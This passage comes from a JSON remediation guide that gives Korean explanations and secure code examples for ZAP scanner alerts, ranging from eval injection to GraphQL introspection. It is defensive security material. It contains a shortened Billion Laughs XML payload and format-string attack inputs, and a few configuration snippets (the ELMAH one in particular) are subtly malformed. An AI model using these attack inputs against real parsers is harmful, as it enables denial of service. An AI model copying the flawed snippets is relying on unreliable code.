      "**사용자 입력에 대한 강력한 검증 및 필터링:** 만약 이러한 함수를 반드시 사용해야 한다면 (매우 드문 경우), 함수에 전달되는 모든 문자열이 신뢰할 수 있는 소스에서 오고, 사용자 입력이 포함되지 않도록 철저히 검증하고 필터링합니다.",
      "**콘텐츠 보안 정책 (Content Security Policy - CSP) 구현:** `script-src` 지시어에서 `unsafe-eval` 키워드 사용을 피하여 `eval()`과 같은 함수 실행을 차단합니다."
    ],
    "example_javascript_secure": "// Insecure (vulnerable to code injection)\n// const code = \"alert('Hello from eval!');\";\n// eval(code);\n// setTimeout(\"alert('Delayed eval!');\", 1000);\n\n// Secure (preferring safer alternatives)\n// If you need to parse JSON:\nconst jsonString = '{\"message\": \"Hello from JSON!\"}';\nconst data = JSON.parse(jsonString);\nconsole.log(data.message);\n\n// If you need a delayed execution:\nsetTimeout(() => {\n    console.log('Delayed function call!');\n}, 1000);\n\n// If you need to call a function dynamically:\nconst functions = {\n    'greet': () => console.log('Hello!')\n};\nconst functionName = 'greet';\nif (functions[functionName]) {\n    functions[functionName]();\n}"
  },
  "Deprecated Feature Policy Header Set": {
    "translated": "더 이상 사용되지 않는 Feature Policy 헤더 설정됨 – 구식 보안 정책 헤더가 사용되고 있음 (Permissions Policy 권장)",
    "description": "`Feature-Policy` 헤더가 설정되어 있지만, 이 헤더가 `Permissions-Policy`로 대체되어 더 이상 권장되지 않는 상태입니다. 이는 최신 브라우저에서 올바르게 적용되지 않거나 보안 효과가 없을 수 있음을 의미합니다.",
    "solution_guidelines": [
      "**`Permissions-Policy` 헤더로 전환:** `Feature-Policy` 헤더 대신 최신 표준인 `Permissions-Policy` 헤더를 사용하도록 웹 서버 또는 애플리케이션의 설정을 업데이트합니다.",
      "**권한 정책 정의:** 애플리케이션이 웹 브라우저의 특정 기능(예: 카메라, 마이크, Geolocation 등)에 접근하는 것을 허용하거나 차단하는 정책을 명확하게 정의합니다."
    ],
    "example_http_headers_secure": "# Deprecated: Feature-Policy: geolocation 'none'; camera 'none';\n\n# Recommended: Permissions-Policy 헤더 사용 예시\n# 모든 출처에서 geolocation 사용을 막고, 자신의 출처에서만 camera 사용을 허wa용\nPermissions-Policy: geolocation=(), camera=(self)"
  },
  "Directory Browse": {
    "translated": "디렉토리 브라우징 – 웹 서버의 파일 및 디렉토리 목록이 그대로 노출됨",
    "description": "웹 서버가 디렉토리 내의 파일 목록을 웹 브라우저를 통해 직접 보여주도록 설정되어 있어, 민감한 파일이나 디렉토리 구조가 노출될 수 있는 취약점입니다. 이는 공격자가 서버의 구성이나 숨겨진 파일들을 파악하는 데 도움을 줄 수 있습니다.",
    "solution_guidelines": [
      "**디렉토리 브라우징 기능 비활성화:** 웹 서버 설정(Apache, Nginx, IIS 등)에서 디렉토리 인덱싱 또는 디렉토리 목록 표시 기능을 명시적으로 비활성화합니다.",
      "**기본 문서(index.html, index.php 등) 제공:** 모든 디렉토리에 `index.html`, `index.php`와 같은 기본 문서를 제공하여 디렉토리 목록 대신 웹 페이지가 표시되도록 합니다.",
      "**불필요한 파일 제거:** 웹 서버에 배포된 디렉토리 내에 불필요한 파일(개발용 파일, 백업 파일, 민감한 설정 파일 등)이 없는지 확인하고 제거합니다."
    ],
    "example_nginx_config": "# Nginx 설정 예시 (디렉토리 브라우징 비활성화)\nserver {\n    # ...\n    location / {\n        autoindex off; # 디렉토리 인덱싱 비활성화\n        index index.html index.htm index.php; # 기본 문서 설정\n        # ...\n    }\n}",
    "example_apache_config": "# Apache 설정 예시 (.htaccess 또는 httpd.conf)\nOptions -Indexes # 디렉토리 브라우징 비활성화\nDirectoryIndex index.html index.php # 기본 문서 설정"
  },
  "ELMAH Information Leak": {
    "translated": "ELMAH 정보 유출 – ASP.NET의 오류 로깅 파일(ELMAH)이 노출되어 상세 시스템 정보가 유출될 수 있음",
    "description": "ASP.NET 애플리케이션에서 오류 로깅 및 모니터링 라이브러리인 ELMAH가 외부에 노출되어, 애플리케이션의 오류 정보(스택 트레이스, 연결 문자열, 사용자 정보 등)가 웹을 통해 유출될 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**ELMAH 대시보드 접근 제한:** `web.config` 설정을 통해 ELMAH 대시보드 URL에 대한 접근을 특정 IP 주소, 인증된 사용자 또는 역할로만 제한합니다.",
      "**ELMAH 로깅 비활성화 (운영 환경):** 운영 환경에서는 ELMAH 로깅 기능을 완전히 비활성화하거나, 로컬에서만 접근 가능한 형태로 구성합니다.",
      "**오류 메시지 사용자에게 직접 노출 금지:** ELMAH가 아닌 일반적인 애플리케이션 오류 발생 시에도, 상세한 오류 메시지(스택 트레이스 등)를 사용자에게 직접 노출하지 않고 일반적인 오류 페이지를 보여주도록 합니다."
    ],
    "example_web_config_elmah": "<elmah>\n  <security allowRemoteAccess=\"false\" /> <security>\n    <role name=\"Administrators\" />\n  </security>\n</elmah>\n\n<location path=\"elmah.axd\">\n  <system.web>\n    <authorization>\n      <deny users=\"?\" /> <allow roles=\"Administrators\" /> </authorization>\n  </system.web>\n</location>"
  },
  "Email address found in WebSocket message": {
    "translated": "웹소켓 메시지 내 이메일 주소 발견 – 웹소켓 통신 중 이메일 주소가 노출될 수 있음",
    "description": "WebSocket 메시지를 통해 이메일 주소와 같은 개인 식별 정보(PII)가 평문으로 전송되어, 통신이 가로채이거나 로깅될 경우 정보 유출의 위험이 있는 취약점입니다.",
    "solution_guidelines": [
      "**WebSocket 통신에 HTTPS(WSS) 사용:** 모든 WebSocket 통신은 반드시 `wss://` 프로토콜을 사용하여 암호화된 채널을 통해 이루어져야 합니다.",
      "**민감 정보는 서버 측에서 처리:** 이메일 주소와 같은 민감한 정보는 WebSocket 메시지로 직접 전송하지 않고, 서버 측에서 관리하고 처리합니다.",
      "**토큰 기반 인증 및 데이터 암호화:** 필요하다면 사용자 식별을 위해 세션 토큰을 사용하고, 전송되는 데이터 중 민감한 부분은 암호화하여 전송합니다.",
      "**불필요한 정보 전송 자제:** WebSocket 메시지에 필요하지 않은 이메일 주소나 다른 PII는 포함하지 않습니다."
    ],
    "example_general": "# 일반적인 WebSocket 보안 가이드라인\n# 1. 항상 wss:// 사용 (TLS 암호화)\n# 2. 민감 정보 직접 전송 금지\n# 3. 토큰 기반 인증 사용\n# 4. 서버 측에서 사용자 정보 관리"
  },
  "Emails Found in the Viewstate": {
    "translated": "ViewState 내 이메일 주소 발견 – ASP.NET ViewState에 이메일 주소가 저장되어 노출될 수 있음",
    "description": "ASP.NET ViewState에 이메일 주소와 같은 민감한 개인 식별 정보(PII)가 포함되어 웹 페이지 소스 코드를 통해 노출될 수 있는 취약점입니다. ViewState는 단순히 인코딩될 뿐 암호화되지 않으므로, 디코딩 시 정보가 노출됩니다.",
    "solution_guidelines": [
      "**ViewState에 민감 정보 저장 금지:** 이메일 주소, 비밀번호, 신용카드 번호 등 어떠한 민감한 정보도 ViewState에 직접 저장하지 않습니다.",
      "**ViewState 암호화 및 무결성 보호 활성화:** MachineKey를 사용하여 ViewState의 암호화(Encryption)와 무결성(Integrity) 보호를 활성화하여 변조 및 정보 유출을 방지합니다. (완벽한 보안은 아니지만 기본적인 보호 제공)",
      "**ViewState 최소화:** ViewState의 크기를 줄이고, 필요한 최소한의 데이터만 저장하도록 합니다.",
      "**ViewState 대신 다른 상태 관리 기술 고려:** 세션, 데이터베이스, 캐시 등 서버 측 상태 관리 기술을 사용하여 민감 정보를 관리하는 것을 고려합니다."
    ],
    "example_web_config_viewstate": "<system.web>\n  <machineKey validationKey=\"AutoGenerate,IsolateApps\" decryptionKey=\"AutoGenerate,IsolateApps\" validation=\"AES\" decryption=\"Auto\" />\n  </system.web>"
  },
  "Exponential Entity Expansion (Billion Laughs Attack)": {
    "translated": "지수 엔티티 확장 (Billion Laughs 공격) – XML 파싱 시 서비스 거부 공격을 유발할 수 있음",
    "description": "XML 파서가 엔티티 확장을 재귀적으로 처리하는 취약점으로, 악의적으로 조작된 XML 문서가 시스템의 메모리나 CPU 자원을 과도하게 소비하여 서비스 거부(DoS)를 유발할 수 있는 공격입니다.",
    "solution_guidelines": [
      "**XML 파서 설정 변경:** XML 파서에서 엔티티 확장을 비활성화하거나, 확장되는 엔티티의 수, 깊이, 총 크기 등에 제한을 설정하여 공격을 방어합니다.",
      "**외부 DTD 로드 비활성화:** XML 파서가 외부 DTD(Document Type Definition)를 로드하지 않도록 설정하여 외부 엔티티 공격을 차단합니다.",
      "**안전한 XML 파서 사용:** 최신 버전의 XML 파서 라이브러리를 사용하고, 해당 라이브러리에서 제공하는 보안 설정을 적용합니다.",
      "**입력값 검증:** XML 입력값을 받기 전에 스키마 검증 등을 통해 유효한 형식인지 확인하고, 비정상적인 구조는 거부합니다."
    ],
    "example_java_xml_secure": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.xml.sax.InputSource;\nimport java.io.StringReader;\n\npublic class SecureXmlParsing {\n    public static void main(String[] args) throws Exception {\n        String xmlString = \"<?xml version=\\\"1.0\\\"?>\" +\n                           \"<!DOCTYPE lolz [<!ENTITY lol \\\"lol\\\">...<!ENTITY lol9 \\\"&lol8;\\\">]>\" +\n                           \"<lolz>&lol9;</lolz>\"; // 공격 예시\n\n        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n        dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); // DOCTYPE 선언 비활성화\n        dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); // 외부 일반 엔티티 비활성화\n        dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); // 외부 매개변수 엔티티 비활성화\n        // 추가적으로 XMLInputFactory (StAX) 사용 시:\n        // XMLInputFactory xmlInputFactory = XMLInputFactory.newInstance();\n        // xmlInputFactory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);\n        // xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);\n\n        DocumentBuilder db = dbf.newDocumentBuilder();\n        db.parse(new InputSource(new StringReader(xmlString)));\n        System.out.println(\"XML parsed securely.\");\n    }\n}"
  },
  "Expression Language Injection": {
    "translated": "표현식 언어 주입 – 서버 측 표현식 언어를 조작하여 악성 코드를 실행할 수 있음",
    "description": "사용자 입력이 서버 측 Expression Language(EL) 파서에 의해 안전하게 처리되지 않고 직접 삽입되어, 공격자가 임의의 코드를 실행하거나 시스템 정보에 접근할 수 있는 취약점입니다. 주로 Java 기반 웹 애플리케이션(JSP, JSF, Spring 등)에서 발생할 수 있습니다.",
    "solution_guidelines": [
      "**사용자 입력값에 대한 강력한 유효성 검사 및 필터링:** EL 컨텍스트에 삽입되는 모든 사용자 입력값에 대해 엄격한 화이트리스트 기반 유효성 검사를 수행하고, 허용되지 않는 문자나 EL 표현식 구문을 필터링합니다.",
      "**EL 표현식 직접 사용 자제:** 사용자 입력이 EL 표현식으로 직접 평가되는 것을 가능한 한 피합니다. 대신, 입력값을 모델 객체에 안전하게 바인딩하고, 이 모델 객체의 속성을 EL로 참조하도록 합니다.",
      "**샌드박싱(Sandboxing):** 가능한 경우, EL 평가 환경을 샌드박스 처리하여 잠재적인 공격의 범위를 제한합니다.",
      "**최신 버전의 프레임워크 사용:** 사용 중인 프레임워크(Spring, JSF 등)의 최신 버전을 유지하여 알려진 EL Injection 취약점에 대한 패치를 적용합니다."
    ],
    "example_java_spring_secure": "// Spring (Java) 예시 - EL Injection 방어\n// 사용자 입력값을 직접 EL로 평가하지 않고, 데이터 바인딩 사용\n\n// @Controller\n// public class MyController {\n//     @PostMapping(\"/submit\")\n//     public String submitForm(@ModelAttribute(\"formData\") MyFormData formData, Model model) {\n//         // formData 객체는 안전하게 바인딩된 사용자 입력값을 포함\n//         // EL은 이 formData 객체의 속성을 참조 (예: ${formData.username})\n//         model.addAttribute(\"message\", \"Hello, \" + formData.getUsername() + \"!\");\n//         return \"result\";\n//     }\n// }\n\n// MyFormData.java\n// public class MyFormData {\n//     private String username;\n//     // Getter, Setter\n// }\n\n// JSP/Thymeleaf 등 템플릿\n// <p>${message}</p>\n// <p>Username: ${formData.username}</p>"
  },
  "ExtensionGraphQl": {
    "translated": "GraphQL 확장 기능 – GraphQL 확장 기능이 사용되고 있는지 확인",
    "description": "GraphQL 엔드포인트가 탐지되었음을 알리는 ZAP의 정보성 알림입니다. 이는 취약점 자체라기보다는 GraphQL 엔드포인트의 존재를 식별하여 관련 잠재적 취약점(예: 인트로스펙션 노출, 과도한 데이터 노출, 권한 문제 등)에 대한 추가 검토가 필요함을 시사합니다.",
    "solution_guidelines": [
      "**GraphQL 인트로스펙션(Introspection) 제어:** 운영 환경에서는 인트로스펙션 쿼리를 비활성화하거나, 인증된 사용자에게만 허용하도록 설정하여 스키마 정보 노출을 최소화합니다.",
      "**권한 및 인증 구현:** 모든 GraphQL 쿼리 및 뮤테이션에 대해 강력한 인증 및 권한 부여 로직을 적용하여 인가되지 않은 접근을 차단합니다.",
      "**깊이/복잡도 제한:** 과도하게 깊거나 복잡한 쿼리로 인한 서비스 거부(DoS) 공격을 방지하기 위해 쿼리 깊이 제한 및 복잡도 제한을 구현합니다.",
      "**에러 메시지 최소화:** 클라이언트에 반환되는 에러 메시지에 민감한 정보(스택 트레이스, 내부 시스템 경로 등)가 포함되지 않도록 합니다.",
      "**데이터 노출 최소화:** 필요한 데이터만 노출하고, 민감한 필드는 적절한 권한 없이는 접근할 수 없도록 합니다."
    ],
    "example_graphql_guideline": "# GraphQL 보안 가이드라인\n# 1. 운영 환경에서 인트로스펙션 비활성화 또는 제한\n# 2. 모든 요청에 강력한 인증/권한 부여 적용\n# 3. 쿼리 깊이/복잡도 제한 구현\n# 4. 상세 에러 메시지 노출 금지\n# 5. 불필요한 데이터 노출 방지"
  },
  "External Redirect": {
    "translated": "외부 리다이렉션 – 사용자를 악의적인 외부 웹사이트로 넘길 수 있는 취약점",
    "description": "사용자 입력(주로 URL 파라미터)에 따라 웹 애플리케이션이 외부 도메인으로 리다이렉트될 때, 공격자가 악의적인 외부 사이트로 사용자를 유도하여 피싱, 멀웨어 다운로드 등의 공격을 수행할 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**리다이렉트 대상 화이트리스트 사용:** 리다이렉트할 수 있는 URL을 미리 정의된 안전한 도메인 목록(화이트리스트)으로 제한하고, 사용자 입력값이 이 목록에 포함되어 있는지 검증합니다.",
      "**사용자 입력으로 직접 리다이렉트 금지:** 사용자 입력값을 URL로 직접 사용하여 리다이렉트하는 것을 피합니다.",
      "**리다이렉트 경고 페이지 제공:** 불가피하게 외부 리다이렉트가 필요한 경우, 사용자에게 외부 사이트로 이동한다는 경고 페이지를 보여주고 사용자의 확인을 받도록 합니다.",
      "**URL 인코딩 및 디코딩 주의:** URL 파라미터를 사용할 때, 인코딩/디코딩 과정에서 예상치 못한 리다이렉트 경로가 생성되지 않도록 주의합니다."
    ],
    "example_python_flask_secure": "# Python Flask 예시 (안전한 외부 리다이렉트)\nfrom flask import Flask, request, redirect, url_for\n\napp = Flask(__name__)\n\n# 허용된 리다이렉트 도메인 화이트리스트\nALLOWED_REDIRECT_DOMAINS = [\n    'https://www.safesite.com',\n    'https://another.trusted.site'\n]\n\n@app.route('/redirect')\ndef external_redirect():\n    target_url = request.args.get('url', '')\n    if any(target_url.startswith(domain) for domain in ALLOWED_REDIRECT_DOMAINS):\n        return redirect(target_url)\n    else:\n        # 안전하지 않은 URL이거나 화이트리스트에 없는 경우\n        return \"Invalid redirect URL\", 400"
  },
  "Fetch Metadata Request Headers": {
    "translated": "Fetch Metadata 요청 헤더 – Sec-Fetch-Dest 등 웹 자원 요청 시 보안을 강화하는 헤더가 사용되는지 확인",
    "description": "ZAP이 `Sec-Fetch-Site`, `Sec-Fetch-Mode`, `Sec-Fetch-Dest`, `Sec-Fetch-User`와 같은 Fetch Metadata Request Headers의 존재를 탐지했음을 알리는 정보성 알림입니다. 이 헤더들은 웹 애플리케이션이 크로스 사이트 공격(CSRF, XSSI 등)을 방어하는 데 활용될 수 있는 강력한 보안 메커니즘을 제공합니다.",
    "solution_guidelines": [
      "**Fetch Metadata Request Headers 활용:** 서버 측에서 이 헤더들을 분석하여 요청의 출처와 유형을 파악하고, 신뢰할 수 없는 크로스 사이트 요청을 차단하는 보안 로직을 구현합니다.",
      "**자격 증명 요청에 대한 검증 강화:** 특히 `Sec-Fetch-Site: cross-site`이고 `Sec-Fetch-Mode: navigate` 또는 `Sec-Fetch-Dest: document`인 요청에 대해, 자격 증명(쿠키)이 포함된 민감한 요청이 아닌지 확인하여 CSRF를 방어합니다.",
      "**불필요한 크로스 사이트 요청 거부:** 애플리케이션의 필요에 따라, 특정 유형의 크로스 사이트 요청을 기본적으로 거부하고, 명시적으로 허용된 경우에만 처리하도록 합니다."
    ],
    "example_fetch_metadata_guideline": "# Fetch Metadata Request Headers 활용 예시 (Node.js Express)\napp.use((req, res, next) => {\n    const secFetchSite = req.get('Sec-Fetch-Site');\n    const secFetchMode = req.get('Sec-Fetch-Mode');\n    const secFetchDest = req.get('Sec-Fetch-Dest');\n\n    // CSRF 방어를 위한 예시:\n    // 만약 크로스 사이트 요청인데, navigation (링크 클릭 등)이고,\n    // 문서 (HTML 페이지)를 요청하는 경우 (즉, 사용자 조작으로 보이는 경우),\n    // 그리고 이 요청이 민감한 액션 (예: 비밀번호 변경)을 포함한다면 추가 검증 필요.\n    if (secFetchSite === 'cross-site' && secFetchMode === 'navigate' && secFetchDest === 'document') {\n        // CSRF 토큰 검증 로직 등 추가 보안 검사를 수행\n        // console.log(\"Potentially suspicious cross-site navigation request detected.\");\n    }\n    next();\n})"
  },
  "File Content Disclosure (CVE-2019-5418)": {
    "translated": "파일 콘텐츠 노출 (CVE-2019-5418) – 특정 취약점을 통해 파일 내용이 노출될 수 있음",
    "description": "CVE-2019-5418은 Ruby on Rails에서 발생했던 취약점으로, 특정 조건에서 `.erb` 파일의 내용이 일반 텍스트로 노출될 수 있었습니다. 이는 템플릿 파일 내의 민감한 정보(예: 데이터베이스 연결 문자열, API 키 등)가 유출될 수 있음을 의미합니다.",
    "solution_guidelines": [
      "**Ruby on Rails 최신 버전으로 업데이트:** 해당 취약점이 패치된 Ruby on Rails의 최신 버전으로 업데이트합니다.",
      "**`.erb` 파일 직접 접근 차단:** 웹 서버 설정(Apache, Nginx 등)을 통해 `.erb` 파일에 대한 직접적인 웹 접근을 명시적으로 거부합니다. 이 파일들은 서버 측에서 렌더링되어야 하며 클라이언트에 직접 제공되어서는 안 됩니다.",
      "**템플릿 파일에 민감 정보 저장 금지:** 템플릿 파일(`.erb` 등)에는 어떠한 민감한 정보도 하드코딩하거나 직접 저장하지 않고, 환경 변수나 보안 설정 파일을 통해 로드하도록 합니다."
    ],
    "example_nginx_config": "# Nginx 설정 예시 (.erb 파일 직접 접근 차단)\nlocation ~ \\.erb$ {\n    deny all;\n}"
  },
  "File Upload": {
    "translated": "파일 업로드 – 파일을 업로드할 수 있는 기능이 있는지 확인",
    "description": "파일 업로드 기능이 제공될 때, 악의적인 사용자가 웹 쉘, 악성 스크립트, 실행 파일 등 위험한 파일을 업로드하여 서버에 대한 제어권을 획득하거나 서비스 거부 공격을 수행할 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**업로드 파일 형식(확장자) 화이트리스트:** 업로드 가능한 파일의 확장자를 이미지(`.jpg`, `.png`, `.gif`), 문서(`.pdf`) 등 허용된 안전한 형식으로만 제한하고, 블랙리스트 방식은 우회될 수 있으므로 지양합니다.",
      "**업로드 파일 이름 변경:** 업로드된 파일의 원래 이름을 사용하지 않고, 서버에서 안전하게 생성된 고유한 이름(예: UUID)으로 변경하여 경로 추측 공격이나 중복 파일 문제를 방지합니다.",
      "**업로드 파일 내용 검증:** 이미지 파일인 경우 실제 이미지인지 확인하고, 기타 파일도 파일 시그니처 등을 통해 실제 파일 유형을 검증합니다. (확장자만으로는 불충분)",
      "**업로드 경로 제한 및 권한 설정:** 업로드된 파일은 웹 서버의 실행 권한이 없는 별도의 디렉토리에 저장하고, 웹 서버에서 직접 접근할 수 없도록 권한을 최소화합니다.",
      "**업로드 파일 크기 제한:** 업로드 파일의 최대 크기를 제한하여 서비스 거부 공격을 방지합니다.",
      "**안티바이러스 스캔:** 업로드된 파일을 서버에 저장하기 전에 안티바이러스 스캐너로 검사하는 것을 고려합니다."
    ],
    "example_php_file_upload_secure": "// PHP 파일 업로드 보안 예시\n$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];\n$max_file_size = 5 * 1024 * 1024; // 5MB\n\nif (isset($_FILES['uploadFile'])) {\n    $file_name = $_FILES['uploadFile']['name'];\n    $file_tmp = $_FILES['uploadFile']['tmp_name'];\n    $file_size = $_FILES['uploadFile']['size'];\n    $file_error = $_FILES['uploadFile']['error'];\n\n    $file_ext = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));\n\n    if ($file_error !== 0) {\n        die('파일 업로드 오류.');\n    }\n    if ($file_size > $max_file_size) {\n        die('파일 크기가 너무 큽니다.');\n    }\n    if (!in_array($file_ext, $allowed_extensions)) {\n        die('허용되지 않는 파일 형식입니다.');\n    }\n\n    // 고유한 파일 이름 생성\n    $new_file_name = uniqid() . '.' . $file_ext;\n    $upload_dir = '/var/www/uploads/'; // 웹 루트 외부의 안전한 디렉토리\n\n    // 파일 유형 재검증 (필요 시)\n    // getimagesize() 또는 finfo_open() 등을 사용하여 실제 파일 유형 확인\n\n    if (move_uploaded_file($file_tmp, $upload_dir . $new_file_name)) {\n        echo '파일이 성공적으로 업로드되었습니다.';\n    } else {\n        echo '파일 업로드 실패.';\n    }\n}"
  },
  "Format String Error": {
    "translated": "포맷 스트링 오류 – 포맷 스트링 취약점으로 인해 메모리 조작 또는 코드 실행이 발생할 수 있음",
    "description": "C/C++ 언어에서 `printf`, `sprintf` 등의 서식 문자열(format string) 함수를 사용할 때, 사용자 입력값을 서식 문자열로 직접 사용하여 메모리 내용을 읽거나 임의 코드를 실행할 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**사용자 입력값을 서식 문자열로 사용 금지:** `printf()` 계열 함수에서 사용자 입력값을 서식 문자열 인자(`format`)로 직접 사용하지 않습니다. 대신, 사용자 입력은 항상 일반 문자열 인자(`...`)로 전달합니다.",
      "**정적 서식 문자열 사용:** 서식 문자열은 항상 개발자가 고정된 문자열 리터럴로 제공해야 합니다.",
      "**안전한 함수 사용:** C++에서는 `std::string`과 스트림(stream) 기반 입출력(`std::cout <<`, `std::stringstream`)을 사용하여 서식 문자열 취약점을 방지합니다. C 언어에서는 `snprintf()`와 같이 버퍼 오버플로우를 방지하는 함수를 사용합니다.",
      "**정적 분석 도구 활용:** 정적 분석 도구(예: Clang Static Analyzer, Coverity)를 사용하여 Format String 취약점과 같은 잠재적인 코드 결함을 탐지합니다."
    ],
    "example_c_secure": "// C 언어 예시 (안전한 Format String 사용)\n\n#include <stdio.h>\n#include <string.h>\n\nvoid log_message_secure(const char* user_input) {\n    char buffer[256];\n    // 안전한 사용: 사용자 입력은 항상 일반 문자열 인자로 전달\n    snprintf(buffer, sizeof(buffer), \"User message: %s\", user_input);\n    printf(\"%s\\n\", buffer);\n}\n\nvoid log_message_insecure(const char* user_input) {\n    // 취약한 사용: 사용자 입력이 서식 문자열 인자로 직접 사용됨\n    // printf(user_input); // 공격자가 %x %s %n 등을 삽입 가능\n}\n\nint main() {\n    log_message_secure(\"Hello, world!\");\n    log_message_secure(\"User input with %x %s %n might be malicious!\"); // 안전하게 처리됨\n\n    // log_message_insecure(\"Hello! %x %x %x\"); // 잠재적 취약점\n    return 0;\n}"
  },
  "Full Path Disclosure": {
    "translated": "전체 경로 노출 – 웹 서버의 파일 시스템 전체 경로가 오류 메시지 등을 통해 드러남",
    "description": "웹 애플리케이션의 오류 메시지, 경고 또는 기타 응답에 서버 파일 시스템의 전체 경로가 노출되는 취약점입니다. 이는 공격자가 서버의 구조를 파악하고 다른 공격(예: 파일 포함 취약점)을 계획하는 데 도움을 줄 수 있습니다.",
    "solution_guidelines": [
      "**운영 환경에서 상세 오류 메시지 비활성화:** 개발/디버그 환경에서만 상세한 오류 메시지를 활성화하고, 운영 환경에서는 일반적인 오류 페이지나 간단한 메시지만 사용자에게 보여주도록 설정합니다.",
      "**에러 로깅 시스템 사용:** 모든 오류는 서버 측에서 안전하게 로깅하고, 로깅된 정보는 관리자만 접근할 수 있도록 합니다.",
      "**커스텀 에러 페이지 설정:** 웹 서버와 애플리케이션 프레임워크 모두에서 사용자에게 보여질 커스텀 에러 페이지를 설정하여, 상세 오류 정보가 노출되지 않도록 합니다.",
      "**외부에 노출되는 구성 파일 검토:** 웹 서버 설정 파일, 애플리케이션 설정 파일 등이 웹을 통해 직접 접근되지 않도록 권한을 설정하고 민감한 경로 정보를 포함하지 않도록 합니다."
    ],
    "example_php_error_reporting": "// PHP 예시 (운영 환경에서 오류 보고 비활성화)\n// php.ini 설정\n// display_errors = Off\n// display_startup_errors = Off\n// log_errors = On\n\n// 또는 애플리케이션 코드 내에서\nif (ENVIRONMENT == 'production') {\n    ini_set('display_errors', 'Off');\n    ini_set('display_startup_errors', 'Off');\n    error_reporting(E_ALL); // 모든 오류를 로깅하도록 설정\n} else {\n    ini_set('display_errors', 'On');\n    ini_set('display_startup_errors', 'On');\n    error_reporting(E_ALL);\n}",
    "example_spring_boot_error": "# Spring Boot application.properties 예시 (에러 메시지 상세도 조절)\nserver.error.include-exception=false\nserver.error.include-stacktrace=never\nserver.error.whitelabel.enabled=false # 기본 화이트라벨 에러 페이지 비활성화\nspring.web.resources.add-mappings=false # 정적 리소스 매핑에서 경로 노출 방지"
  },
  "GET for POST": {
    "translated": "POST 요청을 GET으로 처리 – 중요한 작업을 GET 요청으로도 처리하여 CSRF에 취약할 수 있음",
    "description": "HTTP POST 요청으로 처리되어야 할 중요한 작업(예: 회원가입, 비밀번호 변경, 결제 등)이 GET 요청으로도 처리될 수 있는 취약점입니다. GET 요청은 URL에 데이터가 노출되고, 캐시되거나 브라우저 히스토리에 남을 수 있어 보안에 취약합니다.",
    "solution_guidelines": [
      "**중요한 작업은 반드시 POST 요청으로만 처리:** 상태를 변경하거나 민감한 데이터를 전송하는 모든 작업은 반드시 HTTP POST, PUT, DELETE 메서드를 사용하도록 애플리케이션을 설계하고 구현합니다.",
      "**HTTP 메서드 검증:** 서버 측에서 요청이 올바른 HTTP 메서드를 사용했는지 검증하고, 잘못된 메서드(예: GET)로 들어온 요청은 거부하거나 405 Method Not Allowed 응답을 반환합니다.",
      "**CSRF 토큰 사용:** POST 요청에 대해서도 CSRF 토큰을 사용하여 요청의 유효성을 검증하여 CSRF 공격을 방어합니다."
    ],
    "example_java_spring_secure": "// Spring (Java) 예시 (POST 메서드만 허용)\nimport org.springframework.web.bind.annotation.PostMapping;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestMethod;\n\n// @PostMapping 어노테이션은 POST 요청만 처리\n@PostMapping(\"/change-password\")\npublic String changePassword(@RequestParam String newPassword) {\n    // 비밀번호 변경 로직\n    return \"password_changed\";\n}\n\n// @RequestMapping(value = \"/delete-account\", method = RequestMethod.class);\n// public String deleteAccount() {\n//     // 계정 삭제 로직\n//     return \"account_deleted\";\n// }"
  },
  "Generic Padding Oracle": {
    "translated": "일반적인 패딩 오라클 – 암호화된 데이터를 복호화할 수 있는 취약점",
    "description": "블록 암호화 알고리즘(예: AES, DES)에서 패딩(Padding)을 사용하는 암호화 방식의 구현 오류로 인해 발생합니다. 공격자가 암호화된 데이터(암호문)를 조작하여 서버의 응답을 통해 원본 평문 데이터를 한 바이트씩 복호화할 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**안전한 암호화 모드 사용:** CBC 모드와 같은 패딩 오라클 공격에 취약한 모드 대신, 인증된 암호화 모드(Authenticated Encryption with Associated Data, AEAD)인 GCM (Galois/Counter Mode) 또는 CCM (Counter with CBC-MAC)을 사용합니다. 이 모드들은 암호화와 무결성 검증을 동시에 제공합니다.",
      "**복호화 실패 시 일반적인 에러 메시지 반환:** 복호화 또는 무결성 검증 실패 시, '잘못된 패딩'과 같이 공격자에게 힌트가 될 수 있는 상세한 에러 메시지를 반환하지 않고, 일반적인 '잘못된 요청' 또는 '처리 실패' 메시지를 반환합니다.",
      "**암호화 라이브러리 최신 버전 유지:** 사용 중인 암호화 라이브러리를 항상 최신 버전으로 유지하여 알려진 패딩 오라클 취약점이 패치되었는지 확인합니다.",
      "**메시지 인증 코드(MAC) 사용:** CBC 모드와 같은 일반적인 암호화 모드를 사용해야 하는 경우, HMAC과 같은 별도의 메시지 인증 코드(MAC)를 사용하여 암호문의 무결성을 검증하고, 검증 실패 시 복호화를 시도하지 않도록 합니다."
    ],
    "example_general_cryptography": "# 일반적인 암호화 보안 가이드라인\n# 1. AEAD 모드 (GCM, CCM) 사용을 최우선으로 고려\n# 2. 복호화/무결성 검증 실패 시 일반적인 에러 메시지 반환\n# 3. 암호화 라이브러리 최신 버전 유지\n# 4. 필요 시 HMAC 등으로 무결성 추가 검증"
  },
  "GraphQL Endpoint Supports Introspection": {
    "translated": "GraphQL 엔드포인트 인트로스펙션 지원 – GraphQL 스키마 정보가 외부에 공개되어 데이터베이스 구조 파악에 이용될 수 있음",
    "description": "GraphQL 서버가 인트로스펙션(Introspection) 쿼리를 지원하여, 공격자가 GraphQL 스키마의 전체 구조(쿼리, 뮤테이션, 타입, 필드 등)를 쉽게 파악할 수 있도록 하는 정보성 알림입니다. 이는 잠재적인 공격 벡터를 식별하는 데 도움을 줄 수 있습니다.",
    "solution_guidelines": [
